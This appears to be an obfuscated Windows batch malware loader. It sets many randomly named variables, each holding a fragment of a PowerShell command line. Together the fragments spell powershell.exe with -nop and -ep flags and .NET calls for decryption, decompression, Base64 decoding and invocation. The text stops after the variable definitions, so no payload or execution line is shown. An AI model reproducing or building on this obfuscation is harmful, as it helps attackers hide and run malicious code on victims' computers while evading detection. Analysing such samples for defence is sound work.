@echo off
set "GzHwFkJjNT= /"
set "TnrMhMXCxQ=1."
set "wWLhzLDjnM=do"
set "UWRzbaSHjC=32"
set "sPLjQKEghE=\W"
set "HDUVnvIlnB=0\"
set "XzFDgkKUUr=py"
set "mpoAlDqFCz=ow"
set "gvTvkQRGAJ=rS"
set "EJXJfwdEKf=we"
set "IIYuKCqGKZ=y "
set "BtckwAqrMc=Wi"
set "tytwzuYFwn=ws"
set "xRMvmpPzJO=he"
set "RLNHiJAJqd=ll"
set "bGLRPsVOaF=.e"
set "eovUQtMbSn=s\"
set "CXrClbGZKj=xe"
set "IuJpNmfCYS=st"
set "ruVrgRmLbH=\v"
set "ttiZaHfwyZ=:\"
set "wlZBHPxYXF=co"
set "hlwHrJkBTt=Sy"
set "okdZewwjJz=in"
set "QBncNCfRaJ=ll"
set "fJjGfGYKNj=nd"
set "ceycUEtbAv=we"
set "MPmpNxDiKx= C"
set "jKOnXRnoQM=em"
set "phpwsdWvou=po"
set "jbxzrLYUte=he"
set "MXlAwNAZdL=rs"
set "ngglxKTRvF=Po"
set "ualusRHLfK= %~dp0"
set "RwyGWhtADJ=cd"
set "srfcIWnRLQ=JO.I"
set "aWvQAISphP=RmAx"
set "TaybhXUUWl=]::("
set "oNFbwAwvEf='')("
set "KCHIdABnvx=ecry"
set "AdMzcyYjWm=($uG"
set "peYijoQgcG=Invo"
set "KasTkGySWR=, $o"
set "QEzkBkOjal=Stre"
set "CjKrZsdWAe=e]::"
set "YlZkDazXss=$Zra"
set "OjBcDkfzGI=join"
set "fUeqwwhWzY=em.I"
set "jdTHMYgqpZ= = N"
set "neJVbbsFQE=bXo."
set "KMIhhbuYLA=brea"
set "oPFDpcYRLd=Rw, "
set "CaciMPzixl=XxhR"
set "lhKGlQTqds=y]::"
set "PCUDWfctQI=k; }"
set "glGtTOKiUk=w = "
set "QPLschVzqr=$TeY"
set "pTbmRPgjba=-nop"
set "fkWrxzrRvW==');"
set "AcHzdKkozH=ose("
set "rJKRQRhrrN=$TeY"
set "THHtnAatCk=$loI"
set "wUgpqBOCBg= = $"
set "qckESmSozN=ZraQ"
set "KOuCEZpQly=bXo "
set "FfHTOTOegK=y.Ci"
set "HMwPQjZrsg=6esa"
set "ZbmNzchWsn=raQt"
set "LTfyJHcUbL=PcJO"
set "wXhbfzZedA=lit("
set "biqdosSttB=esMa"
set "HmkWVHXfUw=am;$"
set "zsKRjQntOu=.Sec"
set "ZkTcbrCcjQ=n ''"
set "gstFtgoNqd=gP ="
set "YgwixXnXct=m.En"
set "ftsdrbzngz='0Pg"
set "zvFMRuOnLE=-joi"
set "tCYkiIQhZS=..-1"
set "TeXaDTzBDb=ress"
set "KlxPPGtfcY=pStr"
set "shXHYfuPDJ=($uG"
set "ZMBJMFrAEc=m.IO"
set "OInVvDvzKK=);$e"
set "UMwkQgTqSG=ose("
set "vCQxVncxaJ=pher"
set "MeYTKWXJLZ=l5E7"
set "OkRVzSGXOm=vert"
set "iRQQFukYKg=tryP"
set "ERQczLsJWh=Jr ="
set "MfLBAaTUFU=ateD"
set "GndXnGDuCy=loIp"
set "zvFHyptOCJ=ct S"
set "dEJiktepoY=();$"
set "UcxzQQAfYE=r = "
set "naqneDoXll=[IO."
set "KqExZDqTKc=);$e"
set "nRziYbqNAh=dYS."
set "hLtulvvICI=::De"
set "jhmPtAKwgn=ress"
set "LvUNWiIOOj=orF'"
set "lAfEGQyBbt=Conv"
set "pHdirdfhJO=-ep "
set "JGxLrMFyGC=rans"
set "ImtNUQcUbs=lBlo"
set "GifZIhDczs=ddin"
set "gEEFaMUVVT=trea"
set "gCqnVjigVY=Jr);"
set "OFszIDjsue=VTm "
set "ZYmyCltpDv=)))"
set "jrRqCGLxUF='txe"
set "MqHdTOdFgq=106u"
set "cYsoocTrtZ=pres"
set "gySjMJJMxC= = $"
